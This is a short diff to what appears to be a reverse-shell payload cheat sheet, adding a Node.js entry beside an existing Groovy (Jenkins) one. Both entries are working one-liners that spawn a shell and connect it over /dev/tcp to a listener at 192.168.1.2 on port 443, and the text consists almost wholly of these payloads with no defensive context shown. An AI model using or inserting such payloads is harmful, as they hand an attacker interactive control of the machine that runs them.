@@ -150,6 +150,11 @@
   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
   p.waitFor()
   ```
+  `Node.js`
+  
+  ```cmd
+  require('child_process').exec('bash -i >& /dev/tcp/192.168.1.2/443 0>&1');
+  ```
   
 `Groovy (Jenkins)`
 
